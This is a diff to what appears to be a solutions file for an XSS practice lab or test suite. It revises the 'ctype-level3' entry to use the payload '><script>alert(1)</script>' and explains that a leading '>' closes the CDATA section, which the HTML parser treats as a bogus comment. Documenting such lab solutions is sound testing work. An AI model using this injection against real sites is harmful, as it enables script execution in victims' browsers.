@@ -18,10 +18,10 @@ Reflections under unusual Content-Type values (XML/XHTML/CDATA/JSONP/SVG/nosniff
 
 ### ctype-level3
 
-`/ctype/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`
+`/ctype/level3/?query=%3E%3Cscript%3Ealert(1)%3C/script%3E`
 
-- payload: `<script>alert(1)</script>`
-- context: text/html with CDATA — HTML parser ignores CDATA, sees tags directly
+- payload: `><script>alert(1)</script>`
+- context: text/html: `<![CDATA[` is a bogus comment ending at the first `>`; lead with `>` to close it
 
 ### ctype-level4
 
